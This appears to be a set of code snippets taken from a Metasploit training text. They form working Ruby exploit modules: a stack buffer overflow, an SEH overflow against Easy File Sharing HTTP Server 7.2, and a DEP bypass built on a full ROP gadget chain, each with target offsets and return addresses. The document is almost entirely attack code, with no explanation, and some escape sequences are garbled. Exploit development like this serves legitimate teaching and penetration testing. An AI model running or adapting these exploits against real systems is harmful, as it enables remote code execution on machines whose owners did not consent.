["```\n'Payload'        => \n      { \n        'Space'    => 800, \n        'BadChars' => \"\\x00\\x20\\x0a\\x0d\", \n        'StackAdjustment' => -3500, \n      }, \n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n  Rank = NormalRanking \n\n  include Msf::Exploit::Remote::Tcp \n\n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'                 => 'Stack Based Buffer Overflow Example', \n      'Description'    => %q{ \n         Stack Based Overflow Example Application Exploitation Module \n      }, \n      'Platform'             => 'win', \n      'Author'         => \n        [ \n          'Nipun Jaswal' \n        ], \n      'Payload' => \n      { \n      'space' => 1000, \n      'BadChars' => \"\\x00\\xff\", \n      }, \n      'Targets' => \n       [ \n             ['Windows XP SP2',{ 'Ret' => 0x71AB9372, 'Offset' => 520}] \n       ], \n      'DisclosureDate' => 'Mar 04 2018' \n   )) \n   register_options( \n   [ \n         Opt::RPORT(200) \n   ]) \n  end \n```", "```\ndef exploit \n    connect \n    buf = make_nops(target['Offset']) \n    buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded \n    sock.put(buf) \n    handler \n    disconnect \n  end \nend\n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n\n  Rank = NormalRanking \n\n  include Msf::Exploit::Remote::Tcp \n  include Msf::Exploit::Seh \n\n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'           => 'Easy File Sharing HTTP Server 7.2 SEH Overflow', \n      'Description'    => %q{ \n        This module demonstrate SEH based overflow example \n      }, \n      'Author'         => 'Nipun', \n      'License'        => MSF_LICENSE, \n      'Privileged'     => true, \n      'DefaultOptions' => \n        { \n          'EXITFUNC' => 'thread', \n     'RPORT' => 80, \n        }, \n      'Payload'        => \n        { \n          'Space'    => 390, \n          'BadChars' => \"x00x7ex2bx26x3dx25x3ax22x0ax0dx20x2fx5cx2e\", \n        }, \n      'Platform'       => 'win', \n      'Targets'        => \n        [ \n          [ 'Easy File Sharing 7.2 HTTP', { 'Ret' => 0x10019798, 'Offset' => 4061 } ], \n        ], \n      'DisclosureDate' => 'Mar 4 2018', \n      'DefaultTarget'  => 0)) \n  end \n```", "```\ndef exploit \n  connect \n  weapon = \"HEAD \" \n  weapon << make_nops(target['Offset']) \n  weapon << generate_seh_record(target.ret) \n  weapon << make_nops(19) \n  weapon << payload.encoded \n  weapon << \" HTTP/1.0rnrn\" \n  sock.put(weapon) \n  handler \n  disconnect \n  end \nend \n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n  Rank = NormalRanking \n\n  include Msf::Exploit::Remote::Tcp \n\n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'                 => 'DEP Bypass Exploit', \n      'Description'    => %q{ \n         DEP Bypass Using ROP Chains Example Module \n      }, \n      'Platform'             => 'win', \n      'Author'         => \n        [ \n          'Nipun Jaswal' \n        ], \n      'Payload' => \n      { \n      'space' => 312, \n      'BadChars' => \"\\x00\", \n      }, \n      'Targets' => \n       [ \n                  ['Windows 7 Professional',{ 'Offset' => 2006}] \n       ], \n      'DisclosureDate' => 'Mar 4 2018' \n   )) \n   register_options( \n   [ \n         Opt::RPORT(9999) \n   ]) \n  end \n```", "```\ndef create_rop_chain() \n\n    # rop chain generated with mona.py - www.corelan.be \n    rop_gadgets =  \n    [ \n      0x77dfb7e4,  # POP ECX # RETN [RPCRT4.dll]  \n      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll] \n      0x76a5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]  \n      0x766a70d7,  # POP EBP # RETN [USP10.dll]  \n      0x625011bb,  # & jmp esp [essfunc.dll] \n      0x777f557c,  # POP EAX # RETN [msvcrt.dll]  \n      0xfffffdff,  # Value to negate, will become 0x00000201 \n      0x765e4802,  # NEG EAX # RETN [user32.dll]  \n      0x76a5f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll]  \n      0x7779f5d4,  # POP EAX # RETN [msvcrt.dll]  \n      0xffffffc0,  # Value to negate, will become 0x00000040 \n      0x765e4802,  # NEG EAX # RETN [user32.dll]  \n      0x76386fc0,  # XCHG EAX,EDX # RETN [kernel32.dll]  \n      0x77dfd09c,  # POP ECX # RETN [RPCRT4.dll]  \n      0x62504dfc,  # &Writable location [essfunc.dll] \n      0x77e461e1,  # POP EDI # RETN [RPCRT4.dll]  \n      0x765e4804,  # RETN (ROP NOP) [user32.dll] \n      0x777f3836,  # POP EAX # RETN [msvcrt.dll]  \n      0x90909090,  # nop \n      0x77d43c64,  # PUSHAD # RETN [ntdll.dll]  \n    ].flatten.pack(\"V*\") \n\n    return rop_gadgets \n\n  end \n  def exploit \n    connect \n    rop_chain = create_rop_chain() \n    junk = rand_text_alpha_upper(target['Offset']) \n    buf = \"TRUN .\"+junk + rop_chain  + make_nops(16) + payload.encoded+'rn' \n    sock.put(buf) \n    handler \n    disconnect \n  end \nend \n```"]